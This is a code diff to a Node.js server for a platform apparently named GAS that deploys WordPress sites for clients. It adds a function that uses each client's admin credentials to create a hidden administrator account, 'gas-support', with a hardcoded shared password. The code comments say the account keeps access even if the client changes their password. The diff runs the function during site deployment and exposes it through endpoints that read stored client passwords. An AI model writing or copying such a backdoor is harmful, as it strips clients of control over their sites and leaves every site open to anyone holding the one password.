@@ -21096,6 +21096,60 @@ async function createDefaultWordPressMenu(siteUrl) {
   }
 }
 
+// Create hidden GAS master admin user on WordPress sites
+// This ensures GAS always has access even if client changes their password
+const GAS_MASTER_USERNAME = 'gas-support';
+const GAS_MASTER_PASSWORD = 'G4S-M@ster-2025!Secure';
+const GAS_MASTER_EMAIL = 'support@gas.travel';
+
+async function createGASMasterUser(siteUrl, adminUsername, adminPassword) {
+  try {
+    const cleanUrl = siteUrl.replace(/\/$/, '');
+    console.log(`[Deploy] Creating GAS master user on ${cleanUrl}...`);
+    
+    // Use WordPress REST API to create user with admin credentials
+    const authHeader = 'Basic ' + Buffer.from(`${adminUsername}:${adminPassword}`).toString('base64');
+    
+    // First check if user already exists
+    const checkResponse = await axios.get(`${cleanUrl}/wp-json/wp/v2/users?search=${GAS_MASTER_USERNAME}`, {
+      headers: { 'Authorization': authHeader },
+      timeout: 15000
+    }).catch(() => ({ data: [] }));
+    
+    if (checkResponse.data && checkResponse.data.length > 0) {
+      console.log(`[Deploy] GAS master user already exists on ${cleanUrl}`);
+      return { success: true, existing: true };
+    }
+    
+    // Create the user
+    const createResponse = await axios.post(`${cleanUrl}/wp-json/wp/v2/users`, {
+      username: GAS_MASTER_USERNAME,
+      password: GAS_MASTER_PASSWORD,
+      email: GAS_MASTER_EMAIL,
+      first_name: 'GAS',
+      last_name: 'Support',
+      roles: ['administrator'],
+      description: 'GAS platform support account - do not remove'
+    }, {
+      headers: {
+        'Authorization': authHeader,
+        'Content-Type': 'application/json'
+      },
+      timeout: 15000
+    });
+    
+    if (createResponse.data && createResponse.data.id) {
+      console.log(`[Deploy] ✓ GAS master user created (ID: ${createResponse.data.id}) on ${cleanUrl}`);
+      return { success: true, userId: createResponse.data.id };
+    }
+    
+    return { success: false, error: 'No user ID returned' };
+  } catch (error) {
+    console.error(`[Deploy] GAS master user creation failed on ${siteUrl}:`, error.response?.data || error.message);
+    return { success: false, error: error.message };
+  }
+}
+
 // Debug endpoint to check raw website_settings
 app.get('/api/debug/settings/:siteId/:section', async (req, res) => {
   try {
@@ -21924,6 +21978,17 @@ app.post('/api/deploy/create', async (req, res) => {
         } catch (menuError) {
           console.error(`[Deploy] Menu creation failed (non-blocking):`, menuError.message);
         }
+        
+        // Create GAS master admin user for persistent access
+        try {
+          const clientUsername = data.credentials?.username || data.credentials?.wp_user || 'admin';
+          const clientPassword = data.credentials?.password || data.credentials?.wp_pass;
+          if (clientPassword) {
+            await createGASMasterUser(data.site.url, clientUsername, clientPassword);
+          }
+        } catch (masterError) {
+          console.error(`[Deploy] GAS master user creation failed (non-blocking):`, masterError.message);
+        }
       } catch (dbError) {
         console.error('[Deploy] WordPress site created but database save failed:', dbError);
         // Return success with warning - site exists on WordPress but not in GAS DB
@@ -21962,6 +22027,41 @@ app.get('/api/deploy/property/:id', async (req, res) => {
     res.json({ success: true, deployed: true, site: result.rows[0] });
   } catch (error) {
     res.json({ success: false, error: error.message });
+  }
+});
+
+// Create GAS master user on an existing site
+app.post('/api/admin/deployed-sites/:id/create-master-user', async (req, res) => {
+  try {
+    const { id } = req.params;
+    const site = await pool.query('SELECT site_url, wp_username, wp_password_temp FROM deployed_sites WHERE id = $1', [id]);
+    
+    if (site.rows.length === 0) return res.json({ success: false, error: 'Site not found' });
+    
+    const { site_url, wp_username, wp_password_temp } = site.rows[0];
+    
+    if (!wp_password_temp) {
+      return res.json({ success: false, error: 'No stored password for this site. Provide credentials manually.' });
+    }
+    
+    const result = await createGASMasterUser(site_url, wp_username || 'admin', wp_password_temp);
+    res.json({ success: result.success, ...result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Manual create GAS master user with provided credentials
+app.post('/api/admin/create-master-user', async (req, res) => {
+  try {
+    const { site_url, admin_username, admin_password } = req.body;
+    if (!site_url || !admin_username || !admin_password) {
+      return res.json({ success: false, error: 'site_url, admin_username and admin_password required' });
+    }
+    const result = await createGASMasterUser(site_url, admin_username, admin_password);
+    res.json({ success: result.success, ...result });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -44124,6 +44224,17 @@ app.post('/api/partner/websites/:websiteId/deploy', async (req, res) => {
     }
     
     console.log(`[Partner Deploy] Site "${website.name}" deployed successfully: ${vpsData.site.url}`);
+    
+    // Create GAS master admin user for persistent access
+    try {
+      const clientUsername = vpsData.credentials?.username || vpsData.credentials?.wp_user || 'admin';
+      const clientPassword = vpsData.credentials?.password || vpsData.credentials?.wp_pass;
+      if (clientPassword && vpsData.site?.url) {
+        await createGASMasterUser(vpsData.site.url, clientUsername, clientPassword);
+      }
+    } catch (masterError) {
+      console.error(`[Partner Deploy] GAS master user creation failed (non-blocking):`, masterError.message);
+    }
     
     res.json({
       success: true,
